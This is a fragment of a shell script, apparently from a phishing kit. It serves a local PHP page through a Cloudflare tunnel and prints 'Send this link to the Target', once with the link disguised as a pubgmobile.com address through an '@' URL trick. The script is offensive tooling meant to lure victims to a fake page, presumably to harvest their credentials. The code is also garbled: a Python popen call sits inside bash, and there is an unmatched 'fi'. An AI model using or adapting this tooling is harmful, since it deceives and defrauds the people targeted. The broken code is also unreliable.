echo ""
wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
chmod +x *
			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
			   ./cloudflared tunnel -url 127.0.0.1:4444 --logfile log.txt > /dev/null 2>&1 &
			   cflink=popen("cat log.txt | grep -o 'https://[-0-9a-z]*\.trycloudflare.com'").read()
                           sleep 3
                           echo ""
                           
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.pubgmobile.com-@$cflink                                   
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$cflink
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           fi
			   echo ""
